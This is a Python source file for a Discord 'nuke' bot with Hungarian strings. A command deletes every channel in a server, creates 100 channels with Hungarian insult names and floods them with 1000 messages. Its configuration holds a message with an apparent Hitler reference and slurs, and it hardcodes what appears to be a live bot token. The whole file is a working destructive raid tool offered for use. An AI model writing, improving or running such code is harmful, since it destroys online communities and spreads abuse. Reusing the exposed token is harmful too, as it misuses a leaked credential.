

import asyncio
import discord
from discord.ext import commands
import random
import time


# --- CONFIGURE THESE ---
BOT_TOKEN = "MTQ5MDA3MjU0MDI4OTMwMjcxOA.Gw2LM7.5YI-MPW9_P3apYqjzQSI1wmA8TGUkq1hEME2bw"
PREFIX = "."

# Nuke Configuration
CHANNEL_NAME = "Szoptad ocskos"
MESSAGE = "@everyone itt jart Adolf kocsogok"
MESSAGE = "Maded by Mufasza (szjr) " 
AMOUNT_OF_CHANNELS = 100
AMOUNT_OF_MESSAGES = 1000

# Random channel name variations (optional - set to None to use CHANNEL_NAME)
RANDOM_CHANNEL_NAMES = [
    "nuke",
    "buzi",
    "kocsog",
    "kutya",
    "kurva",
    "faszkalap",
    "idiota",
    "pancser"
]

# Set to None to always use CHANNEL_NAME, or keep the list for random names
USE_RANDOM_NAMES = True  # Set to False to use CHANNEL_NAME only

# -----------------------
# DO NOT MODIFY BEYOND THIS POINT UNLESS YOU KNOW WHAT YOU'RE DOING!
# -----------------------

def get_channel_name():
    """Get channel name (random or fixed)"""
    if USE_RANDOM_NAMES and RANDOM_CHANNEL_NAMES:
        return random.choice(RANDOM_CHANNEL_NAMES)
    return CHANNEL_NAME

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

async def send_messages_fast(channels, message, total):
    """Send messages with rate limiting using semaphore"""
    if not channels:
        return
    
    semaphore = asyncio.Semaphore(50)
    
    async def send_with_limit(channel, msg):
        async with semaphore:
            try:
                await channel.send(msg)
            except Exception:
                pass
    
    tasks = []
    for i in range(total):
        channel = channels[i % len(channels)]
        tasks.append(send_with_limit(channel, message))
    
    await asyncio.gather(*tasks, return_exceptions=True)

async def nuke_server(guild: discord.Guild):
    """Main nuke logic - deletes all channels, creates new ones, and spams messages"""
    print(f"Starting nuke on {guild.name} ({guild.id})")
    start_time = time.perf_counter()

    # Step 1: Delete all channels
    print("Deleting all channels...")
    await asyncio.gather(
        *(channel.delete() for channel in guild.channels),
        return_exceptions=True
    )

    # Step 2: Create new channels
    print(f"Creating {AMOUNT_OF_CHANNELS} channels...")
    async def create_raid_channel():
        return await guild.create_text_channel(get_channel_name())
    
    channels = await asyncio.gather(
        *(create_raid_channel() for _ in range(AMOUNT_OF_CHANNELS)),
        return_exceptions=True
    )

    # Step 3: Send messages
    text_channels = [c for c in channels if isinstance(c, discord.TextChannel)]
    if text_channels:
        print(f"Sending {AMOUNT_OF_MESSAGES} messages...")
        await send_messages_fast(text_channels, MESSAGE, AMOUNT_OF_MESSAGES)

    elapsed = time.perf_counter() - start_time
    print(f"Nuke befejezodot  {elapsed:.2f} masodperc allat!")

@bot.event
async def on_ready():
    print(f"A Bot elértheto Udvozlet Martin fonok Milan csokol{bot.user}")
    print(f"Prefix: {PREFIX}")
    print(f"Komandja a nukenak: {PREFIX}.szopatas")
    print("=" * 50)

@bot.command(name="szopatas")
async def nuke(ctx):
    """Nuke the current server"""
    # Check if user has administrator permission
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Admin joggodnak kell lenni a nukehoz!")
        return

    # Confirm the nuke
    await ctx.send("💣 A nukeolás indul...")
    
    # Execute the nuke
    await nuke_server(ctx.guild)

@bot.command(name="config")
async def config(ctx):
    """Show current configuration"""
    config_msg = f"""
**Current Configuration:**
📝 Channel Name: `{CHANNEL_NAME}`
🎲 Random Names: `{'Enabled' if USE_RANDOM_NAMES else 'Disabled'}`
💬 Message: `{MESSAGE[:50]}...`
📊 Channels: `{AMOUNT_OF_CHANNELS}`
📨 Messages: `{AMOUNT_OF_MESSAGES}`
    """
    await ctx.send(config_msg)

if __name__ == "__main__":
    print("Indul a Nuke botod...")
    print("=" * 50)
    bot.run(BOT_TOKEN)
